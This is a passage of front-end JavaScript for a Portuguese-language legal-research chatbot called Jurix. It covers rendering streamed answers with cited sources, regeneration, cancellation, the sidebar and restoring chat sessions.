        const copyButton = messageDiv.querySelector(`#${copyButtonId}`) || document.getElementById(copyButtonId);
        const messageBody = messageDiv.querySelector(`#${messageId}`) || document.getElementById(messageId);

        messageBody._citationSources = Array.isArray(sources) ? sources : [];
        copyButton.setAttribute('data-markdown', answer);
        copyButton.addEventListener('click', () => {
            copyResponseToClipboard(copyButton.getAttribute('data-markdown') || answer, copyButton);
        });

        const regenerateBtn = messageDiv.querySelector('.regenerate-button');

        if (skipStreaming) {
            if (messageBody && typeof marked !== 'undefined' && typeof DOMPurify !== 'undefined') {
                messageBody.innerHTML = renderMarkdown(answer, sources);
            } else {
                messageBody.textContent = answer;
            }
            // Restored history is already complete. Clear any transient
            // streaming classes that may have survived an interrupted page
            // lifecycle so the caret cannot remain below the answer.
            messageBody?.classList.remove('is-streaming', 'jurix-streaming-text');
            window.JurixRagUI?.linkLegalReferences?.(messageBody, sources);
            copyButton.classList.add('show');

            if (regenerateBtn && currentSessionId && showRegenerate) {
                regenerateBtn.classList.remove('is-hidden');
                regenerateBtn.classList.add('show');
                regenerateBtn.addEventListener('click', async () => {
                    await regenerateLastResponse(currentSessionId, messageDiv, sourcesContainer);
                });
            }

            if (sources && sources.length > 0) {
            showSourcesGradually(sourcesContainer, sources, false, answer);
            }
        } else {
            typewriterEffect(messageId, answer, () => {
                window.JurixRagUI?.linkLegalReferences?.(messageBody, sources);
                copyButton.classList.add('show');

                if (regenerateBtn && currentSessionId && showRegenerate) {
                    regenerateBtn.classList.remove('is-hidden');
                    regenerateBtn.classList.add('show');
                    regenerateBtn.addEventListener('click', async () => {
                        await regenerateLastResponse(currentSessionId, messageDiv, sourcesContainer);
                    });
                }

                if (sources && sources.length > 0) {
                    showSourcesGradually(sourcesContainer, sources, true, answer);
                }
            }, sources);
        }
    }

    async function regenerateLastResponse(sessionId, messageDiv, sourcesContainer) {
        if (!sessionId || (chatState && typeof chatState.isBusy === 'function' && chatState.isBusy())) return;

        try {
            if (chatState && typeof chatState.transition === 'function') {
                chatState.transition('regenerating', { sessionId });
            }
            const regenerateBtn = messageDiv.querySelector('.regenerate-button');
            const copyButton = messageDiv.querySelector('.copy-response-button');

            if (regenerateBtn) {
                regenerateBtn.disabled = true;
                regenerateBtn.classList.add('is-busy');
            }

            const messageBody = messageDiv.querySelector('.message-body');
            if (messageBody) {
                messageBody.innerHTML =
                    '<div class="loading-message"><div class="loading-dots"><div class="loading-dot"></div><div class="loading-dot"></div><div class="loading-dot"></div></div><span>Regenerando resposta...</span></div>';
            }

            if (sourcesContainer) sourcesContainer.innerHTML = '';
            if (copyButton) copyButton.classList.add('is-hidden');
            if (regenerateBtn) regenerateBtn.classList.add('is-hidden');

            const data = await chatAPI.regenerateSession(sessionId);
            if (data.success && messageBody) {
                messageBody.innerHTML = '';
                const answerSources = data.grounded === true && Array.isArray(data.sources) ? data.sources : [];
                if (copyButton) copyButton.setAttribute('data-markdown', data.answer);

                typewriterEffect(messageBody.id, data.answer, () => {
                    window.JurixRagUI?.linkLegalReferences?.(messageBody, answerSources);
                    if (copyButton) {
                        copyButton.classList.remove('is-hidden');
                        copyButton.classList.add('show');
                    }
                    if (regenerateBtn) {
                        regenerateBtn.classList.remove('is-hidden');
                        regenerateBtn.classList.add('show');
                        regenerateBtn.disabled = false;
                        regenerateBtn.classList.remove('is-busy');
                    }
                    if (answerSources.length > 0) {
                        showSourcesGradually(sourcesContainer, answerSources, true, data.answer || '');
                    }
                });
            }
        } catch (error) {
            console.error('Error regenerating response:', error);
            const messageBody = messageDiv.querySelector('.message-body');
            if (messageBody) {
                messageBody.innerHTML =
                    '<p class="chat-error-text">Erro ao regenerar resposta. Tente novamente.</p>';
            }
        } finally {
            chatState.transition('idle');
        }
    }

    function copyResponseToClipboard(markdownText, button) {
        const renderer = window.JurixChatRenderer;
        if (renderer && typeof renderer.copyResponseToClipboard === 'function') {
            return renderer.copyResponseToClipboard(markdownText, button);
        }
        return Promise.resolve(false);
    }

    function showSourcesGradually(container, sources, animated = true, answerText = '', metadata = {}) {
        if (!sources || sources.length === 0 || !container) return;
        // Array order is the citation contract: source index N resolves to
        // citation marker [[N]]. Never rank-sort the rendered evidence.
        const orderedSources = [...sources];
        const hasSyntheticFixture = orderedSources.some((source) => source?.synthetic_fixture === true);
        const badgeLabel = hasSyntheticFixture
            ? 'Fixture sintética de QA'
            : metadata.pending ? 'Verificação em andamento' : 'Fontes associadas à resposta';

        const headerHtml = `
            <div class="sources-section">
                <button type="button" class="jurix-sources-pill-btn" aria-label="Abrir painel com ${orderedSources.length} ${orderedSources.length === 1 ? 'fonte consultada' : 'fontes consultadas'}">
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#60A5FA" stroke-width="2">
                        <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
                    </svg>
                    <span>${orderedSources.length} ${orderedSources.length === 1 ? 'fonte consultada' : 'fontes consultadas'}</span>
                    <span class="jurix-sources-pill-badge">${badgeLabel}</span>
                    <span class="jurix-sources-pill-action">Ver fontes →</span>
                </button>
            </div>
        `;

        const existingPill = container.querySelector('.jurix-sources-pill-btn');
        const nextShell = document.createElement('div');
        nextShell.innerHTML = headerHtml;
        const nextPill = nextShell.querySelector('.jurix-sources-pill-btn');
        let pillBtn = existingPill;
        if (existingPill && nextPill) {
            // Keep the trigger node stable so an open drawer can restore focus
            // to it after the terminal, citation-filtered source set arrives.
            existingPill.setAttribute('aria-label', nextPill.getAttribute('aria-label') || 'Abrir fontes consultadas');
            existingPill.innerHTML = nextPill.innerHTML;
            existingPill.closest('.sources-section')?.classList.remove('source-section-visible');
            requestAnimationFrame(() => existingPill.closest('.sources-section')?.classList.add('source-section-visible'));
        } else {
            container.innerHTML = headerHtml;
            pillBtn = container.querySelector('.jurix-sources-pill-btn');
        }
        if (pillBtn) {
            pillBtn._sourcesData = orderedSources;
            pillBtn._sourcesMeta = metadata;
            container._sourcesData = orderedSources;
            container._sourcesMeta = metadata;
        }

        // Source cards belong exclusively to the drawer. Rendering them inline
        // duplicates the evidence UI, makes long legal references collapse the
        // conversation column and exposes sources before the user asks to see
        // them. The pill itself is the only inline affordance.
        const section = container.querySelector('.sources-section');
        if (!section) return;
        const reveal = () => {
            section.classList.add('source-section-visible');
            scrollToBottom();
        };
        if (animated) {
            requestAnimationFrame(reveal);
        } else {
            reveal();
        }
    }

    function markStreamEvidenceCancelled(elements) {
        if (!elements) return;
        elements.cancelledByUser = true;
        window.JurixChatRenderer?.clearPendingAnswer?.(elements.pendingAnswer);
        elements.pendingAnswer = null;
        const container = elements.sourcesContainer;
        if (container) {
            const pill = container.querySelector('.jurix-sources-pill-btn');
            const badge = pill?.querySelector('.jurix-sources-pill-badge');
            if (badge) badge.textContent = 'Não validadas — geração cancelada';
            const cancelledMetadata = {
                ...(container._sourcesMeta || {}),
                pending: false,
                cancelled: true,
            };
            container._sourcesMeta = cancelledMetadata;
            if (pill) pill._sourcesMeta = cancelledMetadata;
            window.JurixRagUI?.updateSourcesDrawerMetadata?.({
                pending: false,
                cancelled: true,
            });
        }
        elements.copyButton?.classList.remove('show');
        elements.copyButton?.classList.add('is-hidden');
        elements.regenerateBtn?.classList.add('is-hidden');
        elements.regenerateBtn?.classList.remove('show');
    }

    function appendNormLookupActions(messageDiv, question) {
        if (!messageDiv || messageDiv.querySelector('.jurix-norm-lookup-actions')) return;
        const actions = document.createElement('div');
        actions.className = 'jurix-norm-lookup-actions';
        actions.setAttribute('role', 'group');
        actions.setAttribute('aria-label', 'Próximas ações para localizar a norma');

        const revise = document.createElement('button');
        revise.type = 'button';
        revise.textContent = 'Revisar pesquisa';
        revise.addEventListener('click', () => {
            const input = document.getElementById('question-textarea') || document.getElementById('hero-search-input');
            if (!input) return;
            input.value = question;
            window.JurixChatShell?.updateCounter?.();
            focusComposerSafely(input);
        });

        const search = document.createElement('a');
        const searchBase = document.body.dataset.normaListUrl || '/normas/';
        search.href = `${searchBase}?q=${encodeURIComponent(question)}`;
        search.textContent = 'Pesquisar nas normas';
        actions.append(revise, search);
        messageDiv.querySelector('.message-content')?.append(actions);
    }

    function createSourceCard(source, index) {
        if (window.JurixRagUI && typeof window.JurixRagUI.renderEvidenceCard === 'function') {
            return window.JurixRagUI.renderEvidenceCard(source, index);
        }
        let rawScore = source.similarity_score;
        if (rawScore === undefined || rawScore === null) {
            rawScore = Math.max(0, 1 - parseFloat(source.distance || 1.0));
        }

        let normalizedScore = Math.max(0, Math.min(1, parseFloat(rawScore) || 0));
        let scorePercent = Math.round(normalizedScore * 100);
        scorePercent = Math.max(1, Math.min(100, scorePercent));

        const scoreClass =
            scorePercent >= 80
                ? 'score-fill-high'
                : scorePercent >= 60
                ? 'score-fill-medium'
                : 'score-fill-low';

        const normaRef = source.norma || source.norma_ref || 'Norma';
        const dispositivoRef = source.dispositivo_ref || '';
        const snippet = source.text || source.full_text || '';
        const isLocalArchive = source.evidence_scope === 'isolated_qa_archive';
        const linkUrl = window.JurixRagUI?.buildSourceUrl?.(source)
            || (isLocalArchive
                ? safeHttpUrl(source.local_pdf_url)
                : safeHttpUrl(source.pdf_url) || safeHttpUrl(source.sapl_url));

        const cardClasses = linkUrl ? 'source-card source-card-clickable jurix-rag-source' : 'source-card jurix-rag-source';
        const dataUrlAttr = linkUrl ? `data-url="${escapeAttr(linkUrl)}"` : '';

        return `
            <div class="${cardClasses}" ${dataUrlAttr} title="${linkUrl ? escapeAttr(openTitle) : ''}">
                <div class="source-card-header">
                    <div class="source-title">${escapeHtml(normaRef)}</div>
                    <div class="source-score">
                        <div class="score-bar">
                            <div class="score-fill ${scoreClass}" data-score="${scorePercent}"></div>
                        </div>
                        <span>${scorePercent}%</span>
                    </div>
                </div>
                ${dispositivoRef ? `<div class="source-meta">${escapeHtml(dispositivoRef)}</div>` : ''}
                <div class="source-snippet">${escapeHtml(snippet.substring(0, 120))}${snippet.length > 120 ? '...' : ''}</div>
            </div>
        `;
    }

    function addErrorMessage(errorText) {
        const messagesWrapper = document.getElementById('messages-wrapper');
        if (!messagesWrapper) return;
        const timestamp = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        const errorHtml = `
            <div class="message message-assistant">
                <div class="message-avatar">
                    <img src="${escapeHtml(config.logoIconUrl)}" alt="Jurix">
                </div>
                <div class="message-content">
                    <div class="message-header">
                        <span class="message-role">Jurix</span>
                        <span class="message-time">${timestamp}</span>
                    </div>
                    <div class="message-body chat-error-body">
                        <span class="error-icon" aria-hidden="true">!</span> ${escapeHtml(errorText)}
                    </div>
                </div>
            </div>
        `;

        messagesWrapper.insertAdjacentHTML('beforeend', errorHtml);
        scrollToBottom();
    }

    // ===== TYPEWRITER & MARKDOWN =====
    function fixMarkdownFormatting(text) {
        return text
            .replace(/([•\-])\s+([^•\n]+?);\s+([•\-])/g, '$1 $2\n$3')
            .replace(/([•\-])\s+([^•\n]+?)\s+([•\-])\s+/g, '$1 $2\n$3 ')
            .replace(/;\s+([•\-])/g, '\n$1')
            .replace(/([^\n])([•\-])\s+/g, '$1\n$2 ')
            .replace(/\n{3,}/g, '\n\n');
    }

    function typewriterEffect(elementId, text, onComplete, sources = []) {
        const element = document.getElementById(elementId);
        if (!element) return;

        text = fixMarkdownFormatting(text);
        const words = text.split(/(\s+)/);
        let wordIndex = 0;
        const speed = 15;
        const fullHtml = renderMarkdown(text, sources);

        function type() {
            if (wordIndex < words.length) {
                const visibleText = words.slice(0, wordIndex + 1).join('');
                try {
                    element.innerHTML = renderMarkdown(visibleText, sources);
                } catch (e) {
                    element.textContent = visibleText;
                }
                wordIndex++;
                scrollToBottomIfAtBottom();
                setTimeout(type, speed);
            } else {
                element.innerHTML = fullHtml;
                scrollToBottom();
                if (onComplete && typeof onComplete === 'function') onComplete();
            }
        }

        type();
    }

    // ===== CORPUS SUGGESTIONS =====
    async function refreshCorpusSuggestions({ force = false } = {}) {
        const dynamic = window.JurixDynamicSuggestions;
        if (!dynamic || typeof dynamic.refresh !== 'function') {
            console.error('[Jurix] Dynamic suggestion module is missing; placeholders are disabled.');
            return [];
        }
        return dynamic.refresh({ force });
    }


    function showWelcomeStateWithStreaming() {
        let welcomeState = document.getElementById('welcome-state');
        if (!welcomeState) return;

        if (chatState && typeof chatState.isGreetingStreaming === 'function' && chatState.isGreetingStreaming()) return;

        welcomeState.classList.remove('is-hidden');
        const greetingNameEl = welcomeState.querySelector('.greeting-name');
        const greetingTextEl = welcomeState.querySelector('.greeting-text');

        if (greetingNameEl && greetingTextEl) {
            let fullName = greetingNameEl.getAttribute('data-user-name') || config.userName || 'Admin';
            greetingTextEl.textContent = '';
            greetingNameEl.textContent = '';
            if (chatState && typeof chatState.beginGreeting === 'function') {
                chatState.beginGreeting();
            }

            const greetingText = 'Olá, ';
            let charIndex = 0;

            function streamNextChar() {
                if (charIndex < greetingText.length) {
                    greetingTextEl.textContent += greetingText[charIndex];
                    charIndex++;
                    setTimeout(streamNextChar, 25);
                } else if (charIndex < greetingText.length + fullName.length) {
                    const nameIndex = charIndex - greetingText.length;
                    greetingNameEl.textContent += fullName[nameIndex];
                    charIndex++;
                    setTimeout(streamNextChar, 40);
                } else {
                    chatState.endGreeting();
                    refreshCorpusSuggestions();
                }
            }

            setTimeout(streamNextChar, 100);
        } else {
            refreshCorpusSuggestions();
        }
    }

    function askQuestion(question) {
        const textarea = document.getElementById('question-textarea');
        if (textarea) {
            textarea.value = question;
            const form = document.getElementById('chat-form');
            if (form) form.dispatchEvent(new Event('submit'));
        }
    }

    // ===== INITIALIZATION =====
    async function initializeChatbot() {
        if (navSeq > 0) return;
        syncComposerScrollClearance();
        const thisToken = ++navSeq;
        const sessionSlug = getSessionSlugFromPath();

        if (sessionSlug) {
            try {
                const data = await chatAPI.getSessionBySlug(sessionSlug);
                if (thisToken !== navSeq) return;
                if (data.success && data.session) {
                    await loadSession(data.session.id, true, thisToken);
                    if (thisToken !== navSeq) return;
                    await loadChatSessions();
                    return;
                }
                window.location.href = config.chatbotUrl;
            } catch (error) {
                if (thisToken !== navSeq) return;
                console.error('Error initializing with slug:', error);
                window.location.href = config.chatbotUrl;
            }
        } else {
            let keepBlank = new URLSearchParams(window.location.search).get('new') === '1';
            try { keepBlank ||= sessionStorage.getItem('jurix:new-conversation') === '1'; } catch (_) {}
            if (thisToken !== navSeq) return;
            currentSessionId = null;
            const messagesWrapper = document.getElementById('messages-wrapper');
            if (messagesWrapper) {
                messagesWrapper.querySelectorAll('.message').forEach((m) => m.remove());
                const welcomeState = document.getElementById('welcome-state');
                if (welcomeState) welcomeState.classList.remove('is-hidden');
            }
            showWelcomeStateWithStreaming();
            await loadChatSessions();

            // A reload at the assistant root should restore the most recent
            // anonymous conversation. Explicitly starting a new conversation
            // opts out once, so the New Conversation button still means blank.
            if (!keepBlank && window.JurixAnonymousHistory?.isAnonymous?.()) {
                const [latest] = window.JurixAnonymousHistory.list();
                if (latest?.id && thisToken === navSeq) await loadSession(latest.id, true, thisToken);
            }
        }

        if (thisToken === navSeq) {
            updateNewChatButtonState();
        }
    }

    // ===== EVENT LISTENERS SETUP =====
    function setupEventListeners() {
        const chatForm = document.getElementById('chat-form');
        const textarea = document.getElementById('question-textarea');
        const newChatBtn = document.getElementById('new-chat-button');
        const toggleSidebarBtn = document.getElementById('toggle-sidebar');
        const sidebar = document.getElementById('sidebar');
        const sidebarBackdrop = document.getElementById('jurix-sidebar-backdrop');

        document.addEventListener('click', (event) => {
            const link = event.target.closest?.('[data-pending-session-link]');
            if (!link) return;
            event.preventDefault();
            const row = link.closest('.chat-session-item');
            if (!row || row.dataset.pendingState !== 'failed') return;
            const input = document.getElementById('question-textarea');
            if (!input) return;
            if (!input.value.trim()) {
                input.value = row.dataset.pendingQuestion || '';
                window.JurixChatShell?.updateCounter();
            }
            focusComposerSafely(input);
        });

        if (toggleSidebarBtn && sidebar) {
            const isMobileSidebar = () => window.matchMedia
                ? window.matchMedia('(max-width: 900px)').matches
                : window.innerWidth <= 900;
            const setMobileSidebarOpen = (open) => {
                if (isMobileSidebar()) sidebar.classList.remove('collapsed');
                sidebar.classList.toggle('is-open', open);
                document.body.classList.toggle('sidebar-open', open);
                toggleSidebarBtn.setAttribute('aria-expanded', String(open));
                toggleSidebarBtn.setAttribute('aria-label', open ? 'Fechar menu' : 'Abrir menu');
                const hidden = isMobileSidebar() && !open;
                sidebar.inert = hidden;
                sidebar.setAttribute('aria-hidden', String(hidden));
                if (open) sidebar.querySelector('a, button, [tabindex]:not([tabindex="-1"])')?.focus();
            };

            const setDesktopSidebarCollapsed = (collapsed) => {
                sidebar.classList.toggle('collapsed', collapsed);
                document.documentElement.setAttribute('data-sidebar-collapsed', String(collapsed));
                sidebar.inert = false;
                sidebar.setAttribute('aria-hidden', 'false');
                toggleSidebarBtn.setAttribute('aria-expanded', String(!collapsed));
                toggleSidebarBtn.setAttribute('aria-label', collapsed ? 'Expandir navegação' : 'Recolher navegação');
                toggleSidebarBtn.title = collapsed ? 'Expandir navegação' : 'Recolher navegação';
                try { localStorage.setItem(SIDEBAR_COLLAPSED_KEY, String(collapsed)); } catch (_) {}
            };
            const readDesktopSidebarCollapsed = () => {
                try { return localStorage.getItem(SIDEBAR_COLLAPSED_KEY) === 'true'; } catch (_) { return false; }
            };

            if (isMobileSidebar()) setMobileSidebarOpen(false);
            else setDesktopSidebarCollapsed(document.documentElement.getAttribute('data-sidebar-collapsed') === 'true' || readDesktopSidebarCollapsed());

            toggleSidebarBtn.addEventListener('click', () => {
                if (isMobileSidebar()) {
                    setMobileSidebarOpen(!sidebar.classList.contains('is-open'));
                    return;
                }
                setDesktopSidebarCollapsed(!sidebar.classList.contains('collapsed'));
            });

            if (sidebarBackdrop) {
                sidebarBackdrop.addEventListener('click', () => {
                    if (isMobileSidebar()) setMobileSidebarOpen(false);
                });
            }

            document.addEventListener('click', (event) => {
                if (isMobileSidebar() && sidebar.classList.contains('is-open') &&
                    !sidebar.contains(event.target) && !toggleSidebarBtn.contains(event.target)) {
                    setMobileSidebarOpen(false);
                }
            });

            document.addEventListener('keydown', (event) => {
                if (event.key === 'Escape' && sidebar.classList.contains('is-open')) {
                    setMobileSidebarOpen(false);
                    toggleSidebarBtn.focus();
                }
            });

            let wasMobileSidebar = isMobileSidebar();
            window.addEventListener('resize', () => {
                const mobileNow = isMobileSidebar();
                if (wasMobileSidebar !== mobileNow) {
                    if (mobileNow) setMobileSidebarOpen(false);
                    else setDesktopSidebarCollapsed(readDesktopSidebarCollapsed());
                }
                wasMobileSidebar = mobileNow;
            });
        }

        if (newChatBtn) {
            newChatBtn.addEventListener('click', () => {
                createNewSession();
                const heroInput = document.getElementById('hero-search-input');
                if (heroInput) heroInput.focus();
            });
        }

        // Hero Search Form (Tela Inicial)
        const heroSearchForm = document.getElementById('hero-search-form');
        const heroSearchInput = document.getElementById('hero-search-input');

        if (heroSearchForm && heroSearchInput) {
            heroSearchForm.addEventListener('submit', (e) => {
                e.preventDefault();
                const q = heroSearchInput.value.trim();
                if (q) {
                    heroSearchInput.value = '';
                    askQuestion(q);
                }
            });

            heroSearchInput.addEventListener('keydown', (e) => {
                if (e.key === 'Enter' && !e.shiftKey) {
                    e.preventDefault();
                    heroSearchForm.dispatchEvent(new Event('submit'));
                }
            });
        }

        // Interactive Dropdowns in Hero Panel
        document.querySelectorAll('.figma-search-dropdown').forEach((dropdown) => {
            dropdown.addEventListener('click', function (e) {
                e.stopPropagation();
                const isActive = this.classList.contains('active');
                document.querySelectorAll('.figma-search-dropdown').forEach((d) => d.classList.remove('active'));
                if (!isActive) {
                    this.classList.add('active');
                }
            });
        });

        document.addEventListener('click', () => {
            document.querySelectorAll('.figma-search-dropdown').forEach((d) => d.classList.remove('active'));
        });

// Composer input/keyboard ergonomics are owned by JurijChatShell.

        if (chatForm) {
            const sendButton = document.getElementById('send-button');
            if (sendButton) {
                sendButton.addEventListener('click', (event) => {
                    const state = chatState?.snapshot?.();
                    if (state?.status !== 'streaming') return;
                    event.preventDefault();
                    event.stopPropagation();
                    if (!chatAPI?.cancelStream?.()) return;
                    chatState.transition('cancelled', { question: activeStreamQuestion });
                    const elements = activeStreamElements;
                    markStreamEvidenceCancelled(elements);
                    if (elements?.messageDiv) {
                        const retryQuestion = activeStreamQuestion;
                        const notice = document.createElement('p');
                        notice.className = 'jurix-stream-interrupted-note';
                        notice.setAttribute('role', 'status');
                        notice.textContent = 'A consulta foi interrompida antes de a resposta ser validada. Você pode tentar novamente.';
                        elements.messageDiv.querySelector('.message-content')?.insertBefore(
                            notice,
                            elements.messageDiv.querySelector('.message-body')
                        );
                        const retry = document.createElement('button');
                        retry.type = 'button';
                        retry.className = 'jurix-interrupted-retry';
                        retry.textContent = 'Tentar novamente';
                        retry.disabled = true;
                        elements.retryButton = retry;
                        retry.addEventListener('click', () => {
                            retryingExistingQuestion = retryQuestion;
                            elements.messageDiv.remove();
                            textarea.value = retryQuestion;
                            window.JurixChatShell?.updateCounter();
                            if (typeof chatForm.requestSubmit === 'function') chatForm.requestSubmit();
                            else chatForm.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
                        }, { once: true });
                        elements.messageDiv.querySelector('.message-actions')?.append(retry);
                    }
                });
            }
            chatForm.addEventListener('submit', async (e) => {
                e.preventDefault();
                if ((chatState && typeof chatState.isBusy === 'function' && chatState.isBusy()) || !textarea) return;

                const question = textarea.value.trim();
                if (!question) return;
                const isRetry = retryingExistingQuestion === question;
                const retryOfTurnId = isRetry ? pendingRetryTurnId : null;
                retryingExistingQuestion = null;
                pendingRetryTurnId = null;
                chatState?.transition?.('submitting', { question });
                try { sessionStorage.removeItem('jurix:new-conversation'); } catch (_) {}
                if (chatState && typeof chatState.setLastQuestion === 'function') {
                    chatState.setLastQuestion(question);
                }

                const welcomeStateEl = document.getElementById('welcome-state');
                if (welcomeStateEl) welcomeStateEl.classList.add('is-hidden');

                updateNewChatButtonState();
                if (!isRetry) addUserMessage(question);

                textarea.value = '';
                resetComposerSize(textarea);
                window.JurixChatShell?.updateCounter();

                if (currentSessionId) {
                    try { localStorage.removeItem(`chat-input-${currentSessionId}`); } catch (_) {}
                }

                const wasNewSession = !currentSessionId;
                if (wasNewSession && !isRetry) {
                    createSessionCardImmediately(question);
                } else if (wasNewSession && isRetry && pendingSessionClientId) {
                    window.JurixSidebar?.markPendingRunning?.(pendingSessionClientId);
                }

                const loadingId = addLoadingMessage();
                if (chatState && typeof chatState.transition === 'function') {
                    chatState.transition('submitting', { question });
                }
                const sendButton = document.getElementById('send-button');
                if (sendButton) sendButton.disabled = true;

    function createStreamingAssistantMessage() {
        const messagesWrapper = document.getElementById('messages-wrapper');
        if (!messagesWrapper) return null;
        document.getElementById('welcome-state')?.classList.add('is-hidden');
        const conversationInput = document.getElementById('conversation-input-bar');
        if (conversationInput) {
            conversationInput.classList.remove('jurix-floating-input-initial', 'is-hidden');
            conversationInput.style.setProperty('display', 'flex', 'important');
        }

        const timestamp = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
        const messageId = 'msg-' + Date.now();
        const sourcesId = 'sources-' + Date.now();
        const copyButtonId = 'copy-btn-' + Date.now();

        const messageDiv = document.createElement('div');
        messageDiv.className = 'message message-assistant';
        messageDiv.innerHTML = `
            <div class="message-avatar">
                <img src="${escapeHtml(config.logoIconUrl)}" alt="Jurix">
            </div>
            <div class="message-content">
                <div class="message-header">
                    <span class="message-role">Jurix</span>
                    <span class="message-time">${timestamp}</span>
                </div>
                <div class="message-body jurix-rag-answer" id="${messageId}"></div>
                <div class="message-actions">
                    <button class="regenerate-button is-hidden" id="regenerate-${Date.now()}" aria-label="Tentar novamente" title="Tentar novamente">
                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M21 3v5h-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                            <path d="M3 21v-5h5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </button>
                    <button class="copy-response-button" id="${copyButtonId}" aria-label="Copiar resposta em Markdown" title="Copiar resposta">
                        <svg class="copy-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" stroke-width="2"/>
                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="currentColor" stroke-width="2"/>
                        </svg>
                        <svg class="check-icon is-hidden" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M20 6L9 17l-5-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </button>
                </div>
                <div id="${sourcesId}"></div>
            </div>
        `;

        messagesWrapper.appendChild(messageDiv);
        scrollToBottom();

        const copyButton = document.getElementById(copyButtonId);
        copyButton.addEventListener('click', () => {
            copyResponseToClipboard(copyButton.getAttribute('data-markdown') || '', copyButton);
        });

        const messageBody = document.getElementById(messageId);
        const pendingAnswer = window.JurixChatRenderer?.showPendingAnswer?.(messageBody) || null;

        return {
            messageDiv,
            messageBody,
            sourcesContainer: document.getElementById(sourcesId),
            copyButton,
            regenerateBtn: messageDiv.querySelector('.regenerate-button'),
            pendingAnswer,
        };
    }

    async function streamAssistantResponse(question, sessionId, onChunk, onSources, onDone, onError, onStatus, retryExistingQuestion = false, retryOfTurnId = null) {
        const controls = window.JurixSearchControls?.getPayload?.() || {};
        // The corpus mode belongs to the page/request context, not to the
        // composer element (which can be replaced while a new chat is created).
        const archiveQaMode = document.body?.dataset.qaArchiveCorpus === 'true'
            || new URLSearchParams(window.location.search).get('corpus') === 'archive-qa';
        return chatAPI.streamAnswer(question, sessionId, {
            onSession(data) {
                currentSessionId = data.session_id;
                if (archiveQaMode) {
                    window.JurixAnonymousHistory?.ensureSession?.(
                        currentSessionId,
                        question,
                        { corpus: 'archive-qa' },
                    );
                }
                chatState?.setSessionId?.(currentSessionId);
                if (pendingSessionClientId) {
                    window.JurixSidebar?.reconcilePending?.(pendingSessionClientId, data);
                }
                const sessionPath = data.session_slug
                    ? `${config.chatbotUrl}${encodeURIComponent(data.session_slug)}/`
                    : data.session_id
                        ? `${config.chatbotUrl}${encodeURIComponent(data.session_id)}/`
                        : null;
                if (sessionPath) {
                    window.history.replaceState({}, '', archiveQaMode ? `${sessionPath}?corpus=archive-qa` : sessionPath);
                }
            },
            onChunk,
            onSources,
            onDone,
            onError,
            onStatus,
            onTitle(data) {
                if (data?.title && data?.client_session_id) {
                    window.JurixSidebar?.updatePendingTitle?.(data.client_session_id, data.title);
                }
                const item = document.querySelector(`[data-session-id="${CSS.escape(String(currentSessionId))}"] .chat-session-main`);
                if (item && data?.title) item.textContent = data.title;
            },
            retryExistingQuestion,
            searchOptions: {
                ...controls,
                ...(archiveQaMode
                    ? { qa_archive_corpus: true }
                    : {}),
                ...(sessionId == null && pendingSessionClientId
                    ? { client_session_id: pendingSessionClientId }
                    : {}),
                ...(retryOfTurnId ? { retry_of_client_turn_id: retryOfTurnId } : {}),
            },
        });
    }

                let streamElements = null;
                let accumulatedText = '';
                let finalSources = [];

                try {
                    if (chatState && typeof chatState.transition === 'function') {
                        chatState.transition('streaming', { question });
                    }
                    streamElements = createStreamingAssistantMessage();
                    activeStreamElements = streamElements;
                    activeStreamQuestion = question;
                    removeLoadingMessage(loadingId);

                    await streamAssistantResponse(
                        question,
                        currentSessionId,
                        async (chunk, chunkMetadata = {}) => {
                            if (streamElements?.cancelledByUser) return;
                            // Never expose unverified model output. The backend streams
                            // only the canonical answer after grounding has accepted it.
                            if (chunkMetadata.provisional) return;
                            window.JurixChatRenderer?.clearPendingAnswer?.(streamElements?.pendingAnswer);
                            if (streamElements) streamElements.pendingAnswer = null;
                            accumulatedText = chunkMetadata.replace ? chunk : accumulatedText + chunk;
                            if (streamElements && streamElements.messageBody) {
                                if (window.JurixRagUI) {
                                    window.JurixRagUI.setStreamingState(streamElements.messageBody, true);
                                    if (chunkMetadata.replace) {
                                        const tokens = accumulatedText.match(/\S+\s*/g) || [accumulatedText];
                                        accumulatedText = '';
                                        for (let index = 0; index < tokens.length; index += 4) {
                                            accumulatedText += tokens.slice(index, index + 4).join('');
                                            window.JurixRagUI.scheduleRender(streamElements.messageBody, accumulatedText);
                                            await new Promise(resolve => window.setTimeout(resolve, 18));
                                        }
                                    } else {
                                        window.JurixRagUI.scheduleRender(streamElements.messageBody, accumulatedText);
                                        await new Promise(resolve => window.setTimeout(resolve, 18));
                                    }
                                } else {
                                    streamElements.messageBody.innerHTML = renderMarkdown(accumulatedText, finalSources);
                                }
                                scrollToBottomIfAtBottom();
                            }
                        },
                        (sources, _confidence, sourceMetadata = {}) => {
                            if (streamElements?.cancelledByUser) return;
                            finalSources = sources || [];
                            if (streamElements?.messageBody) {
                                streamElements.messageBody._citationSources = finalSources;
                                window.JurixRagUI?.setCitationSources?.(streamElements.messageBody, finalSources);
                            }
                            if (streamElements?.sourcesContainer) {
                                const pendingMeta = { ...sourceMetadata, pending: true };
                                streamElements.sourcesContainer._pendingSourcesMeta = pendingMeta;
                                if (finalSources.length > 0) {
                                    showSourcesGradually(
                                        streamElements.sourcesContainer,
                                        finalSources,
